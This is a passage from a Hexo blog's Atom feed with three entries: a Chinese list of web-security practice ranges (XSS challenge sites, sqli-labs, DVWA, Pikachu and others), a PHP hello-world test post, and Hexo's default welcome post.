    <id>http://yoursite.com/2020/05/23/webbachang/</id>
    <published>2020-05-23T15:21:13.000Z</published>
    <updated>2020-05-23T15:39:27.067Z</updated>
    
    <content type="html"><![CDATA[<h3 id="常用WEB漏洞攻防靶场综述："><a href="#常用WEB漏洞攻防靶场综述：" class="headerlink" title="常用WEB漏洞攻防靶场综述："></a>常用WEB漏洞攻防靶场综述：</h3><ol><li><p>线上靶场：</p><p>​    xss挑战之旅：<a href="https://xss.tesla-space.com/">https://xss.tesla-space.com/</a></p><p>​    xss challenges：<a href="https://xss-quiz.int21h.jp/">https://xss-quiz.int21h.jp/</a></p><p>​    Bugku</p></li></ol><ol start="2"><li><p>本地靶场：</p><p>​    sqli-labs</p><p>​    upload-labs</p><p>​    DVWA</p><p>​    Webug 4.0</p><p>​    BWAPP</p><p>​    Pikachu</p></li></ol><p>靶场write up将陆续上传到博客中，敬请期待…</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;常用WEB漏洞攻防靶场综述：&quot;&gt;&lt;a href=&quot;#常用WEB漏洞攻防靶场综述：&quot; class=&quot;headerlink&quot; title=&quot;常用WEB漏洞攻防靶场综述：&quot;&gt;&lt;/a&gt;常用WEB漏洞攻防靶场综述：&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;线上靶场：&lt;/p&gt;
&lt;p&gt;</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="WEB靶场" scheme="http://yoursite.com/tags/WEB%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>test测试</title>
    <link href="http://yoursite.com/2020/05/22/test/"/>
    <id>http://yoursite.com/2020/05/22/test/</id>
    <published>2020-05-22T12:49:22.000Z</published>
    <updated>2020-05-23T15:36:54.145Z</updated>
    
    <content type="html"><![CDATA[<p>这是一次测试。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;hello world!&#x27;</span>;</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这是一次测试。&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;b</summary>
      
    
    
    
    <category term="页面测试" scheme="http://yoursite.com/categories/%E9%A1%B5%E9%9D%A2%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="页面测试" scheme="http://yoursite.com/tags/%E9%A1%B5%E9%9D%A2%E6%B5%8B%E8%AF%95/"/>
    
    <category term="其他" scheme="http://yoursite.com/tags/%E5%85%B6%E4%BB%96/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://yoursite.com/2020/05/22/hello-world/"/>
    <id>http://yoursite.com/2020/05/22/hello-world/</id>
    <published>2020-05-22T07:10:04.145Z</published>
    <updated>2020-05-23T15:36:42.280Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    <category term="其他" scheme="http://yoursite.com/categories/%E5%85%B6%E4%BB%96/"/>
    
    
  </entry>
  
</feed>
